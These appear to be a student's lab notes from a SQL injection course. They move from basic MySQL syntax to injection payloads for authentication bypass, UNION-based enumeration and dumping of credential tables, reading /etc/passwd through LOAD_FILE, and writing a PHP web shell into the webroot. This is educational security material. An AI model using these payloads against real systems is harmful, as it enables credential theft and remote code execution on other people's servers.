- SQL injection refers to attacks against relational databases such as MySQL (whereas injections against non-relational databases, such as MongoDB, are NoSQL injection).
- First, the attacker has to inject code outside the expected user input limits, so it does not get executed as simple user input. In the most basic case, this is done by injecting a single quote (') or a double quote (") to escape the limits of user input and inject data directly into the SQL query.
- reduce the chances of being vulnerable to SQL injections through secure coding methods like user input sanitization and validation and proper back-end user privileges and control
- Structured Query Language (SQL)
- Essential features of DBMS
    - Concurrency
    - Consistency
    - Security
    - Reliability
    - Structured Query Language
- Relational Databases
    - It uses a schema, a template, to dictate the data structure stored in the database
    - Tables in a relational database are associated with keys that provide a quick database summary or access to the specific row or column when specific data needs to be reviewed
    - The relationship between tables within a database is called a Schema.
- Non-relational Databases
    - A non-relational database (also called a NoSQL database) does not use tables, rows, and columns or prime keys, relationships, or schemas. Instead, a NoSQL database stores data using various storage models
    - Due to the lack of a defined structure for the database, NoSQL databases are very scalable and flexible.
    - Types
        - Key-Value
        - Document-Based
        - Wide-Column
        - Graph

## SQL

- SQL Syntax
    - Retrieve, update, delete, create new tables and databases, add/remove users, assign permissions
- Command Line
    - `mysql -u root -p` pass after can be stored in bash_history files
    - `mysql -u root -h [docker.hackthebox.eu](http://docker.hackthebox.eu/) -P 3306 -p`
    - Create database `CREATE DATABASE users;`
    - List Databases `SHOW DATABASES;`
    - sql statements aren’t case sensitive
    - `USE users;`
    
    ```sql
    CREATE TABLE logins (
        id INT,
        username VARCHAR(100),
        password VARCHAR(100),
        date_of_joining DATETIME
        );
    ```
    
    - `SHOW TABLES;`
    - `DESCRIBE logins;`
- Table Properties
    - `id INT NOT NULL AUTO_INCREMENT`
    - `username VARCHAR(100) UNIQUE NOT NULL`
    - `date_of_joining DATETIME DEFAULT NOW()`
    - `PRIMARY KEY (id)`
    
    ```sql
    CREATE TABLE logins (
        id INT NOT NULL AUTO_INCREMENT,
        username VARCHAR(100) UNIQUE NOT NULL,
        password VARCHAR(100) NOT NULL,
        date_of_joining DATETIME DEFAULT NOW(),
        PRIMARY KEY (id)
        );
    ```
    
- SQL Statements
    - INSERT
    
    ```sql
    INSERT INTO table_name VALUES (column1_value, column2_value, column3_value, ...);
    INSERT INTO logins VALUES(1, 'admin', 'p@ssw0rd', '2020-07-02');
    ```
    
    - Selectively `INSERT INTO logins(username, password) VALUES('administrator', 'adm1n_p@ss');`
    - Multiple values `INSERT INTO logins(username, password) VALUES ('john', 'john123!'), ('tom', 'tom123!');`
    - retrieve data with the SELECT statement
    
    ```sql
    SELECT * FROM table_name;
    ```
    
    - `SELECT column1, column2 FROM table_name;`
    - DROP to Remove
    
    ```sql
    DROP TABLE logins; # no confirmation 
    ```
    
    - ALTER
    
    ```sql
    ALTER TABLE logins ADD newColumn INT;
    ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn;
    ALTER TABLE logins MODIFY oldColumn DATE;
    ALTER TABLE logins DROP oldColumn;
    ```
    
    - UPDATE a record
    
    ```sql
    UPDATE table_name SET column1=newvalue1, column2=newvalue2, ... WHERE <condition>;
    UPDATE logins SET password = 'change_password' WHERE id > 1;
    ```
    
- Query results
    - ORDER BY Sorting `SELECT * FROM logins ORDER BY password;`
    - `SELECT * FROM logins ORDER BY password DESC;`
    - `SELECT * FROM logins ORDER BY password DESC, id ASC;`
    - LIMIT results `SELECT * FROM logins LIMIT 2;`
    - Limit with offset `SELECT * FROM logins LIMIT 1, 2;`
    - WHERE `SELECT * FROM table_name WHERE <condition>;`
    - LIKE - matching pattern `SELECT * FROM logins WHERE username LIKE 'admin%';` % acts as wildcard matches all character after admin , _ one character mactching
    - `SELECT * FROM logins WHERE username like '___';`
- SQL Operators
    - AND
    - OR
    - MySQL terms, any non-zero value is considered true, and it usually returns the value 1 to signify true. 0 is considered false
    - NOT
    - AND, OR and NOT operators can also be represented as &&, || and !,
    - `SELECT * FROM logins WHERE username != 'john';`
    - `SELECT * FROM logins WHERE username != 'john' AND id > 1;`
    
    ```sql
    Here is a list of common operations and their precedence, as seen in the MariaDB Documentation:
    
    Division (/), Multiplication (*), and Modulus (%)
    Addition (+) and subtraction (-)
    Comparison (=, >, <, <=, >=, !=, LIKE)
    NOT (!)
    AND (&&)
    OR (||)
    ```
    

## SQL injections

### Intro

```php
$conn = new mysqli("localhost", "root", "password", "users");
$query = "select * from logins";
$result = $conn->query($query);
```

Print result 

```php
while($row = $result->fetch_assoc() ){
	echo $row["name"]."<br>";
}
```

- Injection
    - escaping user-input bounds by injecting a special character like ('), and then writing code to be executed, like JavaScript code or SQL in SQL Injections.
    - `select * from logins where username like '%$searchInput'`
    - (’) will end user input field `1'; SHOW DATABASES;`
    - Note: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.
- Syntax error
    - `Error: near line 1: near "'": syntax error`
    - This is because of the last trailing character, where we have a single extra quote (') that is not closed, which causes a SQL syntax error when executed:
    - `select * from logins where username like '%1'; DROP TABLE users;'`
- Types of SQL injection
    - In-band
        - Union based
        - Error based
    - Blind
        - Boolean Based
        - Time Based
    - Out-of-band
- In this only Union based In bound

### Injections

- Subverting Query Logic
    - Authentication Bypass
        - SELECT * FROM logins WHERE username='admin' AND password = 'p@ssw0rd';
- SQLi Discovery
    - to check if webpage is vulnerable to SQLi
    - add payload after username
    - ‘ “ # ; )
    - Either comment or even number of quotes
- OR injection
    - AND would be evaluated before OR
    - true is `'1'='1’`
    - remove last (‘)
    - `admin' or '1'='1`
    
    ![Untitled](https://prod-files-secure.s3.us-west-2.amazonaws.com/fae9aafb-71e2-4d50-92a6-0d2bb57d3cca/94487252-e9af-44a9-b2ce-603de7a1140b/Untitled.png)
    
- If username not known
    - To successfully log in once again, we will need an overall true query. This can be achieved by injecting an OR condition into the password field, so it will always return true. Let us try `something' or '1'='1` as the password.
    - `' or '1' = '1`
    
    ### Using Comments
    
    - `--` `#`
    - `SELECT username FROM logins; -- Selects usernames from the logins table` space after double dash
    - Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.
    - `SELECT * FROM logins WHERE username = 'admin'; # You can place anything here AND password = 'something'`
    - Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.
    - Auth bypass with comments
        - Injection `admin'--`
        - `SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';`
        - Check another example

### Union Clause

- injecting entire SQL queries executed along with the original query
- The Union clause is used to combine results from multiple SELECT statements
- `SELECT * FROM ports UNION SELECT * FROM ships;`
- A UNION statement can only operate on SELECT statements with an equal number of columns
- `SELECT * FROM products WHERE product_id = 'user_input'`
- Injection `SELECT * from products where product_id = '1' UNION SELECT username, password from passwords-- '`
- Un-even Columns
    - Junk data if we only one column
    - `SELECT "junk" from passwords`
    - `SELECT 1 from passwords`
- Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.
- Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.
    - `SELECT * from products where product_id = '1' UNION SELECT username, 2 from passwords`

### Union Injection

- Detect number of columns
    - Using ORDER BY
        - start with order by 1 , then by 2 ,3
        - `' order by 1-- -`
    - Using UNION
        - error until success
        - `cn' UNION select 1,2,3-- -`
        - `cn' UNION select 1,2,3,4-- -`
    - `cn' UNION select 1,@@version,3,4-- -`

## Exploitation

### Database enumeration

- MySQL Fingerprinting
    - Apache Nginx → Linux → MySQL
    - IIS → MSSQL
- MySQL

| Payload | When to Use | Expected Output | Wrong Output |
| --- | --- | --- | --- |
| SELECT @@version | When we have full query output | MySQL Version 'i.e. 10.3.22-MariaDB-1ubuntu1' | In MSSQL it returns MSSQL version. Error with other DBMS. |
| SELECT POW(1,1) | When we only have numeric output | 1 | Error with other DBMS |
| SELECT SLEEP(5) | Blind/No Output | Delays page response for 5 seconds and returns 0. | Will not delay response with other DBMS |
- INFORMATION_SCHEMA Database
    - UNION SELECT - > list of databases , lista of tables, columns
    - So, to reference a table present in another DB, we can use the dot ‘.’ operator. For example, to SELECT a table users present in a database named my_database, we can use:
    - `SELECT * FROM my_database.users;`
- SCHEMATA
    - table SCHEMATA in the INFORMATION_SCHEMA
    - `SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA;`
    - `cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- -`
    - current database `SELECT database()`
    - `cn' UNION select 1,database(),2,3-- -`
- TABLES
    - TABLES table in the INFORMATION_SCHEMA Database
    - TABLE_SCHEMA and TABLE_NAME columns
    - `cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- -`
- Column
    - COLUMNS table in the INFORMATION_SCHEMA database
    - COLUMN_NAME, TABLE_NAME, and TABLE_SCHEMA columns can be used to achieve this..
    - `cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- -`
- Data
    - `cn' UNION select 1, username, password, 4 from dev.credentials-- -`

### Reading Files

- MySQL, the DB user must have the FILE
- DB User
    - Current user
    
    ```php
    SELECT USER()
    SELECT CURRENT_USER()
    SELECT user from mysql.user
    ```
    
    - `cn' UNION SELECT 1, user(), 3, 4-- -`
    - `cn' UNION SELECT 1, user, 3, 4 from mysql.user-- -`
- User privileges
    - `SELECT super_priv FROM mysql.user`
    - `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- -`
    - `cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- -`
    - `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges-- -`
    - `cn' UNION SELECT 1, grantee, privilege_type, 4 FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- -`
- Load_File
    - `SELECT LOAD_FILE('/etc/passwd');`
    - `cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- -`
    - The default Apache webroot is /var/www/html
    - `cn' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- -`

### Writing Files

- To be able to write files to the back-end server using a MySQL database, we require three things:
    - User with FILE privilege enabled
    - MySQL global secure_file_priv variable not enabled
    - Write access to the location we want to write to on the back-end server
    - `SHOW VARIABLES LIKE 'secure_file_priv';`
    - variables and most configurations' are stored within the INFORMATION_SCHEMA database. MySQL global variables are stored in a table called global_variables, and as per the documentation, this table has two columns variable_name and variable_value.
    - `SELECT variable_name, variable_value FROM information_schema.global_variables where variable_name="secure_file_priv"`
    - `cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- -`
- SELECT INTO OUTFILE
    - `SELECT * from users INTO OUTFILE '/tmp/credentials';`
    - `SELECT 'this is a test' INTO OUTFILE '/tmp/test.txt';`
    - `Tip: Advanced file exports utilize the 'FROM_BASE64("base64_data")' function in order to be able to write long/advanced files, including binary data.`
- Writing Files through SQL injection
    - `select 'file written successfully!' into outfile '/var/www/html/proof.txt’`
    - Note: To write a web shell, we must know the base web directory for the web server (i.e. web root). One way to find it is to use load_file to read the server configuration, like Apache's configuration found at /etc/apache2/apache2.conf, Nginx's configuration at /etc/nginx/nginx.conf, or IIS configuration at %WinDir%\System32\Inetsrv\Config\ApplicationHost.config, or we can search online for other possible configuration locations. Furthermore, we may run a fuzzing scan and try to write files to different possible web roots, using this wordlist for Linux or this wordlist for Windows. Finally, if none of the above works, we can use server errors displayed to us and try to find the web directory that way.
    - `cn' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- -`
- Writing a web shell
    - `<?php system($_REQUEST[0]); ?>`
    - `cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- -`
    - `/shell.php?0=id`
    -